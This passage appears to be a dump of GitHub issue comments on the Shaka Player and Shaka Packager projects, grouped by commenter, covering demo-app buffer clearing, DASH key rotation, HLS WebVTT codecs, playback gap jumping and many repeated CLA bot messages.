regards,\nRyan Chan\n- sent from my iPhone\n\nOn 23 Apr 2016, at 09:20, Jacob Trimble notifications@github.com wrote:\nThis is a limitation of the demo app, which will always clear the buffer. However, if you use the API, you can specify whether to clear the buffer.\nv1: http://v1-6-5.shaka-player-demo.appspot.com/docs/shaka.player.Player.html#selectAudioTrack\nhttp://v1-6-5.shaka-player-demo.appspot.com/docs/shaka.player.Player.html#selectVideoTrack\nv2: http://shaka-player-demo.appspot.com/docs/api/shaka.Player.html#selectTrack\n\u2015\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\n. So, does that mean v1 demo app suffer this, because by default it clears it buffer; while v2 demo app does not suffer this, as by default it keeps the buffer?\n\nMany thanks.\nBest regards,\nRyan Chan\n- sent from my iPhone\n\nOn 23 Apr 2016, at 09:20, Jacob Trimble notifications@github.com wrote:\nThis is a limitation of the demo app, which will always clear the buffer. However, if you use the API, you can specify whether to clear the buffer.\nv1: http://v1-6-5.shaka-player-demo.appspot.com/docs/shaka.player.Player.html#selectAudioTrack\nhttp://v1-6-5.shaka-player-demo.appspot.com/docs/shaka.player.Player.html#selectVideoTrack\nv2: http://shaka-player-demo.appspot.com/docs/api/shaka.Player.html#selectTrack\n\u2015\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\n. It is very clear, thanks for the clarification. I would consider this is the limitation of the demo app.\n\nMany thanks.\nBest regards,\nRyan Chan\n- sent from my iPhone\n\nOn 23 Apr 2016, at 09:38, Jacob Trimble notifications@github.com wrote:\nNo, both demo apps do this.\n\u2015\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\n. It is very clear, thanks for the clarification. I would consider this is the limitation of the demo app.\n\nMany thanks.\nBest regards,\nRyan Chan\n- sent from my iPhone\n\nOn 23 Apr 2016, at 09:38, Jacob Trimble notifications@github.com wrote:\nNo, both demo apps do this.\n\u2015\nYou are receiving this because you authored the thread.\nReply to this email directly or view it on GitHub\n. \n",
    "kqyang": "I believe you are using packager code @ master, between 96abd90ca29bda736e0ddb3ec1bd34aab977c559 and ef81be5f7b5c24fdda779cee272bb45777b7800e. There is a known problem, which has been fixed in 1863f5a569340132760ac3081c70a249ed72ff14.\nPlease try with 1863f5a569340132760ac3081c70a249ed72ff14 or later. Sorry about the inconvenience.\n. @mhassanist Sorry for the misleading error message. You also need to include the init_segment in the command for fMP4. And yes, keep everything else.\nSomething like:\n\npackager input=input.mp4,stream=audio,init_segment=audio_init.mp4,segment_template=audio$Number$.mp4,playlist_name=audio-playlist.m3u8 ...\n. It looks related to https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/12658991/.  We have a workaround in Shaka Packager to make it work in Edge 15 by swapping the order of sinf and avcC boxes. Looks like this is broken in Edge 16 too. @joeyparrish We should talk to our friends at Microsoft again about this long time bug: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/12658991/.\n\n. @zshenker I heard that they already had it fixed in latest Edge (Windows Insider) and they are investigating providing fixes to older versions of Edge, but I haven't verified myself. Can you test and verify if it is really fixed?. If it is fixed, it should be in their late Feb or March release, i.e. in release 17xxx. 16299 is released last September.. Just realized that a similar issue has just been filed: #1098 . +@tinskip \ncenc:default_KID maps to the default_KID field in tenc box, which is carried in the initialization segment. \nI think there are two ways of indicating key rotation for regular (non-hierarchical) key rotation.\n\n\nUse the same initialization segment throughout. The initialization segment, including cenc:default_KID stays the same even if key rotates. Use sbgp sgpd with seig in media segments to indicate the key id (See DASH-IF-IOP v4.1 7.4.1). There is no need to use separate periods when key rotates as neither initialization segment nor cenc:default_KID changes. \n\n\nUpdate cenc:default_KID and thus initialization segment whenever key rotates. A separate period needs to be created when key rotates. default_KID indicates the KID in the representations contained in the period. \n\n\nI don't think either option is against the spec or IOP. Option 1 is probably preferred as initialization segment does not change, although it loses KID indication capability in the manifest.. @sandersaares Agree that option 1 is not compliant to 7.7.9, which seems to be added in IOP v4.1 - I don't see it in v4.0. It does not seem right to me to require different initialization segments for different key rotation periods. I filed an issue to DASH-IF-IOP: https://github.com/Dash-Industry-Forum/DASH-IF-IOP/issues/159.\n@meladc Correct.\n. It is actually a bug in Shaka Packager, which is already fixed. v1.6.2 does not properly support fmp4+hls.\nPlease try again with Shaka Packager latest commit. (Shaka Packager team is preparing for a new release, so hopefully a new release will come out soon)\n. Here it is: https://ci.appveyor.com/api/buildjobs/00kv3f0a5lo28vwt/artifacts/packager-win.exe. No problem. \nBtw, the binary above is for 64-bit Windows. If you happen to use 32-bit, you can always go to this link: https://ci.appveyor.com/project/shaka/shaka-packager and select the relevant config and download the binary from \"artifacts\" tab.. Yes, exactly, the cues in the same sample does have identical time. Right now, the second cue is not shown in Shaka Player.\n. I actually tried adding wvtt codec: https://shaka-player-demo.appspot.com/demo/#asset=https://storage.googleapis.com/wvtemp/kqyang/vtt11/bunny_vtt_master.m3u8;lang=en-US;build=uncompiled\nI am seeing a different error this time: Shaka Error TEXT.INVALID_MP4_VTT.\n. > First I think you put the wvtt codec on the wrong stream. The video stream has a codecs of avc1.42e01e,wvtt, and we don't support multiplexed text+video (although we might be able to once #1266 is fixed). I think you meant to put it on the first #EXT-X-MEDIA stream?\nEXT-X-MEDIA does not have CODECS attribute. For HLS, the codec is specified on the variant stream #EXT-X-STREAM-INF. It does not mean that they are multiplexed in the same container.\n\n  CODECS\n\n\n  The value is a quoted-string containing a comma-separated list of\n  formats, where each format specifies a media sample type that is\n  present in one or more Renditions specified by the Variant Stream.\n  Valid format identifiers are those in the ISO Base Media File\n  Format Name Space defined by The 'Codecs' and 'Profiles'\n  Parameters for \"Bucket\" Media Types [RFC6381].\n\n\nThe logs show No init segment for MP4+VTT!. We require an init segment for VTT in MP4 to get the timescale. Looking at your content, it contains a sidx box that contains the timescale, so we could get it from that instead.\n\nThere is a init segment specified: #EXT-X-MAP:URI=\"bunny_text.mp4\"\n. > The last frame of the first Period ends 32 microseconds after the end of the Period, so the availabilityWindowEnd drops the last frame. This causes a gap to appear in the buffered ranges, but the browser seems to play over it without stalling. Because the browser doesn't fire a waiting event, our gap-jumping logic doesn't trigger to jump the gap. Even though the browser plays through the gap, it stalls a few seconds later, and our stall-detection logic triggers and pushes things forward.\nThere is actually no frame being dropped and adjusting apendWindowEnd does not help. There is a GAP in buffered range using DTS, which is what Chrome is using right now. The GAP is about ~83.3 milliseconds. The problem is gone if the buffered range uses PTS instead of DTS as there is no GAP if using PTS, i.e. if the Chrome's PTS flag is enabled.\nThe problem happens intermittently. It plays smoothly sometimes, and stalls for a few seconds sometimes.\nThe reason for the intermittent stall is because:\n\nGap jumping timer is scheduled to run every 0.25 seconds, which is larger than the gap.\nGap jumping logic kicks in only if the current playback time is within the range [gap_start - 0.1, gap_end)\nWith a gap of ~0.0833, gap jumping logic kicks in ~73.32% (0.1833 / 0.25) of the time. When gap jumping logic kicks in, player jumps over the gap successfully and results in a smooth playback.\nFor the remaining ~26.68% of the time, when the gap jumping timer is scheduled to run, the current playback time has already progressed past gap_end, so the gap jumping logic does not kick in.\nThe reason why the playback time could get past gap_end is because Chrome's playback time is based on audio playback time, which continue to progress until told to stop later. (This is why we are observing a visual stall but continuous audio playback).\nEventually after playing the audio alone with stall screen for a few seconds, current playback time stops progressing, which triggers Shaka Player's stall handling logic. The stall handling logic manages to get the playback out of the stall state, but with a few seconds of video lost.\n\nThere are a few ways we can make this playback smooth:\n- Decrease gap jumping timer frequency to be less than the duration of a typical video frame, e.g. every 0.04 seconds.\n- Increase the gap jumping logic back off time so back_off + video frame duration >= gap jumping interval, e.g. set back off time to 0.22 seconds.\n- Improve Chrome to force audio to stop immediately when video stops. OR expose both audio playback time and video playback time to the player.\nAnyway, the root cause is that there are gaps in the content if using DTS and Chrome uses DTS in buffered range API.\nIn Shaka Packager, we have workarounded the problem by using EditList in v2.2, so for multi-period contents packaged using Shaka Packager v2.2 or above, the problem should not occur.\n@joeyparrish Leave it to you to decide how Shaka Player wants to move forward. It'll be ok with me if you decide to close the issue. \n. The scenario described above actually applies to all small GAPs, i.e. gap duration < gap jumping interval - gap start back_off, so another option we can do is to adjust gap start back_off for small gaps. I can prepare a CL if you are ok with this.. @vaage For @Feenposhleen use case, converting to VOD shouldn't be needed as long as the buffer depth is big enough. From what @Feenposhleen described, it sounds like the buffer depth is unlimited. Perhaps Shaka Player can be improved to not terminating the live stream when the live event ends if the playback is in the past? I wonder how end is signaled in @Feenposhleen's stream and in what condition ended event is emitted in Shaka Player?. @srstrong Your understanding of the DASH spec is correct. TrickPlay implementation using Sub-Representations in combination with Index Segments and Subsegment Index boxes are more efficient, in terms of storage and cpu, than what we are doing now in Shaka Player and Packager.\nUnfortunately, as @joeyparrish pointed out, that requires browser support, which I don't think it is supported in any browsers right now, except possibly Safari. To make it work, I think MSE has to be updated first.\n. \"cbcs\" is supported in Chrome since M68.. > I believe it means creating sub-segments. For example, in MP4, each segment will be composed of multiple moof boxes of the given length. Smaller values might make seeking easier and some players support subsegment fetching\nCorrect. More precisely, fragment duration is the duration of the movie fragment (moof) in MP4. There could be more than one fragments in a segment, which some players can potentially take advantage of. It is also needed in HLS if you want to have more granularity in iframe only playlists as iframe only playlists can only index up to one iframe in a movie fragment (moof).\nIt will also be useful for CMAF low latency chunk support. AdaptationSet switching still happens in segment boundary, but with multiple chunks in a segment, content server can deliver the chunks sooner instead of waiting for the full segment to be available thus reduces the latency. We will provide guidelines on how to do this in coming quarters in Shaka Packager documentation.\n. >   1. Does this mean only 1 fragment per segment?\nYes.\n\n\nWhat happens to mdat box in above case?\n\n\nThere is always one moof and one mdat in a movie fragment.\n\nwhat happens f I provide only segment_duration and not fragment_duration? \n\nThere will be one fragment per segment if fragment_duration is set to 0. The default fragment_duration may not be zero. You may want to set it to 0 to be safe.\n. There isn't really a difference between the two - you can use any one as you wish.\nIf you are using Shaka Packager v2.2 (released last week), you can set --segment_duration only as the default --fragment_duration has been changed to 0.. > We should use this mapping-based offset as the first text segment's start time.\nThe media segment may not start from 0. Do you mean to use the offset + the earliest media segment start time as the first text segment's start time?. > In the third period, the first audio sample appears at 327.0298412. The period start is 327 exactly. The gap is caused by the final audio samples in period 2 getting chopped off at 327 exactly, so we lose 29.8412 ms of audio.\nThe first audio sample of the third period is really at 327.0019, i.e. with a small gap of 0.0019 instead of 0.0298. There might be a bug in Edge not honoring the EditList.\n\nIt appears to be a simple rounding error in the manifest.\n\nIt is not a rounding error, but packager aligns period timelines with video timestamps based on the assumption that browsers can tolerate a small gap in audio but cannot tolerate a small gap in video. \n@joeyparrish Your proposed solution 2 sounds like a good solution to me. Let me know if there is anything we should improve in packager.\n. Will fudging the end of the append window cause problems for multi-period single file content described in https://github.com/Dash-Industry-Forum/DASH-IF-IOP/issues/166 method 1?\n... Period 1           |                 Period 2\n ...  | Video Frame N-1 |  Video Frame N | Video Frame N + 1 |  ...\nFor example, will Video Frame N above be appended twice and cause problems? (Since Period 1 will include part of Video Frame N with end of append window fudging)\n. @joeyparrish Yes, I do want to test a few additional contents. I'll let you know when it is ready.. ",
    "amazinglalu": "I am using v1.6.4 for testing. In v1.6.4, shaka.player.DrmInfo.config can be set by implementing shaka.player.DashVideoSource.ContentProtectionCallback and providing the preproccesor and postprocessor functions. I can set initData member with initDataType keyids and webm. I am trying to implement support for cenc type for ClearKey content protection scheme. Mpd already includes cenc:pssh xml element. As i understand, I do not need to overwrite initData as it should be populated from cenc:pssh box automatically.  How can i get keyid information from that box in this callback and use it for license request url construction?\n. Thanks Joey.\nI was actually doing the same. But I found the issue with my implementation. It was related to how I was handling multiple key systemIds, including Youtube Clearkey system (org.youtube.clearkey). Youtube key system was selected for my test video instead of what I was expecting and licenseRequestInfo.body was empty in shaka.player.DrmInfo.licensePreProcessorcall.\nThanks again for the support.\n. ",
    "googlebot": "We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\n need_author_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\n need_author_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request) and all commit authors, but as best as we can tell these commits were authored by someone else.  If that's the case,  please add them to this pull request and have them confirm that they're okay with these commits being contributed to Google.  If we're mistaken and you did author these commits, just reply here to confirm.\n need_author_consent \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. We found a Contributor License Agreement for you (the sender of this pull request) and all commit authors, but as best as we can tell these commits were authored by someone else.  If that's the case,  please add them to this pull request and have them confirm that they're okay with these commits being contributed to Google.  If we're mistaken and you did author these commits, just reply here to confirm.\n need_author_consent \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request) and all commit authors, but as best as we can tell these commits were authored by someone else.  If that's the case,  please add them to this pull request and have them confirm that they're okay with these commits being contributed to Google.  If we're mistaken and you did author these commits, just reply here to confirm.\n need_author_consent \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\n need_author_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\n need_author_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf you signed the CLA as a corporation, please let us know the company's name.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. So there's good news and bad news.\n:thumbsup: The good news is that everyone that needs to sign a CLA (the pull request submitter and all commit authors) have done so.  Everything is all good there.\n:confused: The bad news is that it appears that one or more commits were authored by someone other than the pull request submitter.  We need to confirm that they're okay with their commits being contributed to this project.  Please have them confirm that here in the pull request.\nNote to project maintainer: This is a terminal state, meaning the cla/google commit status will not change from this state. It's up to you to confirm consent of the commit author(s) and merge this pull request when appropriate.\n need_author_consent \n. We found a Contributor License Agreement for you (the sender of this pull request), but were unable to find agreements for the commit author(s).  If you authored these, maybe you used a different email address in the git commits than was used to sign the CLA (login here to double check)?  If these were authored by someone else, then they will need to sign a CLA as well, and confirm that they're okay with these being contributed to Google.\n need_author_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again.\n\n need_sender_cla \n. CLAs look good, thanks!\n ok \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the project maintainer to go/cla#troubleshoot.\nIn order to pass this check, please resolve this problem and have the pull request author add another comment and the bot will run again.\n\n need_sender_cla \n. Thanks for your pull request.  It looks like this may be your first contribution to a Google open source project. Before we can look at your pull request, you'll need to sign a Contributor License Agreement (CLA).\n:memo: Please visit https://cla.developers.google.com/ to sign.\nOnce you've signed, please reply here (e.g. I signed it!) and we'll verify.  Thanks.\n\n\nIf you've already signed a CLA, it's possible we don't have your GitHub username or you're using a different email address.  Check your existing CLA data and verify that your email is set on your git commits.\nIf your company signed a CLA, they designated a Point of Contact who decides which employees are authorized to participate. You may need to contact the Point of Contact for your company and ask to be added to the group of authorized contributors. If you don't know who your Point of Contact is, direct the 